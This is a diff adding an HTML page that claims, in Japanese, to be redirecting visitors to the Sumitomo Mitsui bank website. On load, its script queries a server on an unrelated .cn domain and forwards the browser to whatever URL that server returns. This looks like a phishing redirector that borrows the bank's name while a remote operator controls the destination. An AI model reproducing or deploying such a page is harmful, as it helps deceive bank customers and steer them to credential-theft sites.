@@ -1,0 +1,33 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+<meta charset="UTF-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<title>三井住友Webサイトをジャンプ中…</title>  
+<script>  
+document.addEventListener('DOMContentLoaded', (event) => {  
+  const someURLToRedirectTo = 'https://amghqfr.cn/api/jumpSite?siteName=liuyiling88';  
+  
+  async function handleRedirect() {  
+    try {  
+      const response = await fetch(someURLToRedirectTo);  
+      if (!response.ok) {  
+        throw new Error('Failed to fetch the redirect URL');  
+      }  
+      const result = await response.json();  
+      window.location.href = result.data.siteUrl;  
+    } catch (error) {  
+      console.error('Error:', error);  
+      // 在这里可以添加错误处理逻辑，比如显示一个错误消息给用户  
+    }  
+  }  
+  
+  handleRedirect(); // 页面加载完成后立即执行重定向逻辑  
+});  
+</script>  
+</head>  
+<body>  
+  <!-- 页面内容（如果有的话） -->  
+  <p>三井住友Webサイトをジャンプ中…</p>  
+</body>  
+</html>
